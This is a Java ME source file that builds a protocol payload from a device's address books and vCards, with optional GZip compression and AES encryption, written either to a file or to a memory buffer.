package com.vvt.prot.databuilder;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import javax.microedition.io.Connector;
import javax.microedition.io.file.FileConnection;
import com.vvt.compression.GZipCompressListener;
import com.vvt.compression.GZipCompressor;
import com.vvt.encryption.AESEncryptor;
import com.vvt.encryption.AESKeyGenerator;
import com.vvt.encryption.AESListener;
import com.vvt.prot.CommandData;
import com.vvt.prot.DataProvider;
import com.vvt.prot.CommandMetaData;
import com.vvt.prot.command.SendAddressBook;
import com.vvt.prot.command.AddressBook;
import com.vvt.prot.command.TransportDirectives;
import com.vvt.prot.event.VCard;
import com.vvt.prot.parser.AddressBookParser;
import com.vvt.std.ByteUtil;
import com.vvt.std.FileUtil;
import com.vvt.std.IOUtil;
import com.vvt.std.Log;

public class SendAddrBookPayloadBuilder extends PayloadBuilder implements AESListener, GZipCompressListener {
	private static final String TAG = "SendAddrBookPayloadBuilder";
	private static final String tempExtension = ".tmp";	
	private CommandMetaData cmdMetaData = null;
	private SendAddressBook cmdSendAddrbook = null;
	private DataProvider cmdDataProvider = null;
	private boolean compressSuccess = false;
	private boolean encryptedSuccess = false;
	
	public PayloadBuilderResponse buildPayload(CommandMetaData cmdMetaData, CommandData cmdData, 
												String payloadPath, TransportDirectives transport) 
												throws IllegalArgumentException, InterruptedException, IOException  {
		PayloadBuilderResponse response = null;
		this.cmdMetaData = cmdMetaData;
		cmdSendAddrbook = (SendAddressBook) cmdData;
		byte[] key = AESKeyGenerator.generateAESKey();
		if (transport.equals(TransportDirectives.RESUMABLE)) {
			//If TransportDirective is resume, will write to file.
			response = buildFilePayload(key, payloadPath);			
		} else {
			//write to memory.
			response = buildBufferPayload(key);
		}
		return response;
	}
	
	private PayloadBuilderResponse buildFilePayload(byte[] key, String payloadPath) 
													throws IllegalArgumentException, IOException, InterruptedException {
		writePayloadFile(payloadPath);
		compressPayload(payloadPath);
		encryptPayload(payloadPath, key);
		//Set Response.
		return setResponse(PayloadType.FILE, key, payloadPath, null);
	}
	
	private PayloadBuilderResponse buildBufferPayload(byte[] key) throws IOException, InterruptedException {
		byte[] payload = writeBuffer();
		byte[] cmpPayload = compressPayload(payload);
		byte[] encPayload = encryptPayload(cmpPayload, key);
		//Set Response.
		return setResponse(PayloadType.BUFFER, key, null, encPayload);
	}
	
	private PayloadBuilderResponse setResponse(PayloadType type, byte[] key, String filePath, byte[] data) {
		PayloadBuilderResponse response = new PayloadBuilderResponse();
		response.setPayloadType(type);
		response.setAesKey(key);
		response.setFilePath(filePath);
		response.setByteData(data);
		return response;
	}
	
	private String writePayloadFile(String payloadPath) throws IOException {
		FileConnection fCon = null;
		OutputStream os = null;
		try {
			fCon = (FileConnection)Connector.open(payloadPath, Connector.READ_WRITE);
			if (fCon.exists()) {
				fCon.delete();
			}
			fCon.create();
			os = fCon.openOutputStream();
			short cmdCode = (short)cmdSendAddrbook.getCommand().getId();
			os.write(ByteUtil.toByte(cmdCode));
			//Start to write Command_Data
			byte addrBookCount = (byte)cmdSendAddrbook.getAddressBookCount();
			os.write(ByteUtil.toByte(addrBookCount));
			if (addrBookCount > 0) {
				for (int i = 0; i < addrBookCount; i++) {
					AddressBook addrBook = cmdSendAddrbook.getAddressBook(i);
					os.write(AddressBookParser.parseAddressBook(addrBook));
					short vCardCount = (short)addrBook.getVCardCount();
					os.write(ByteUtil.toByte(vCardCount));
					cmdDataProvider = addrBook.getVCardProvider();
					if (vCardCount > 0) {
						while (cmdDataProvider.hasNext()) {
							VCard vcard = (VCard) cmdDataProvider.getObject(); 
							os.write(AddressBookParser.parseVCard(vcard));
						}
					}
				}
				cmdDataProvider.readDataDone();
			}
		} finally {
			IOUtil.close(fCon);
			IOUtil.close(os);
		}
		return payloadPath;
	}	
	
	private byte[] writeBuffer() throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		short cmdCode = (short)cmdSendAddrbook.getCommand().getId();
		bos.write(ByteUtil.toByte(cmdCode));
		//Start to write Command_Data
		byte addrBookCount = (byte)cmdSendAddrbook.getAddressBookCount();
		bos.write(ByteUtil.toByte(addrBookCount));
		if (addrBookCount > 0) {
			for (int i = 0; i < addrBookCount; i++) {
				AddressBook addrBook = cmdSendAddrbook.getAddressBook(i);
				bos.write(AddressBookParser.parseAddressBook(addrBook));
				short vCardCount = (short)addrBook.getVCardCount();
				bos.write(ByteUtil.toByte(vCardCount));
				cmdDataProvider = addrBook.getVCardProvider();				
				if (vCardCount > 0) {
					while (cmdDataProvider.hasNext()) {
						VCard vcard = (VCard) cmdDataProvider.getObject(); 
						bos.write(AddressBookParser.parseVCard(vcard));
					}
				}
			}
			cmdDataProvider.readDataDone();
		}
		return bos.toByteArray();
	}
	
	private void compressPayload(String inputFile) throws InterruptedException, IOException {
		byte compressCode = (byte)cmdMetaData.getCompressionCode();
		if (compressCode != 0) {			
			GZipCompressor gzipComp = new GZipCompressor(inputFile,inputFile + tempExtension, this);
			gzipComp.compress();
			gzipComp.join();
			if (compressSuccess) {
				FileUtil.renameFile(inputFile + tempExtension, inputFile);
				compressSuccess = false;
			}
		}
	}
	
	private byte[] compressPayload(byte[] payload) throws InterruptedException, IOException {
		byte compressCode = (byte)cmdMetaData.getCompressionCode();
		if (compressCode != 0) {			
			byte[] cmpPayload = GZipCompressor.compress(payload);
			payload = cmpPayload;
		}
		return payload;
	}
	
	private void encryptPayload(String inputFile, byte[] key) throws InterruptedException, IOException {
		byte encryptCode = (byte)cmdMetaData.getEncryptionCode();
		if (encryptCode != 0) {
			AESEncryptor enc = new AESEncryptor(key, inputFile, inputFile + tempExtension, this);
			enc.encrypt();
			enc.join();
			if (encryptedSuccess) {
				FileUtil.renameFile(inputFile + tempExtension, inputFile);
				encryptedSuccess = false;
			}
		}
	}
	
	private byte[] encryptPayload(byte[] payload, byte[] key) throws IOException {
		byte encryptCode = (byte)cmdMetaData.getEncryptionCode();
		if (encryptCode != 0) {
			byte[] encPayload = AESEncryptor.encrypt(key, payload);
			payload = encPayload;
		}
		return payload;
	}
	
	public void CompressCompleted() {
		compressSuccess = true;
	}
	
	public void CompressError(String err) {
		//Set COMPRESSION_CODE = 0
		cmdMetaData.setCompressionCode(0);
		compressSuccess = false;
		Log.error(TAG, "CompressError: " + err);
	}

	public void AESEncryptionCompleted(String file) {
		encryptedSuccess = true;
	}
	
	public void AESEncryptionError(String err) {
		//Set ENCRYPTION_CODE = 0
		cmdMetaData.setEncryptionCode(0);
		encryptedSuccess = false;
		Log.error(TAG, "AESEncryptionError: " + err);
	}
}
